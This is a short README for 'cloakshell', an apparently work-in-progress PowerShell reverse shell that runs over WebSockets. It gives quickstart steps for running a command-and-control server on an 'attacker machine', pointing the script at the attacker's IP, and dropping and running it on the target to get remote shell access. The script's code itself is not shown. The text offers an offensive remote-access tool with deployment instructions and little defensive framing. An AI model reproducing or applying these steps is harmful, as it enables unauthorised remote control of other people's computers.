# cloakshell
Powershell reverse shell via WebSockets

#### ⚠️ Work in progress ⚠️
This project is very much a work in progress. Call it a proof of concept if you
like.

If you know better ways to implement what you see, hit me up with a PR.

#### Quickstart

On the attacker machine install the dependencies and run the command and control server.

```
pip install -r requirements.txt
python control.py
```

In cloakshell.ps1, change the IP address in the `$endpoint` variable to your attacker's IP address. Now drop it on the client and execute it.

```
.\cloakshell.ps1
```

That's it! You have a (somewhat) functional reverse shell over websockets.
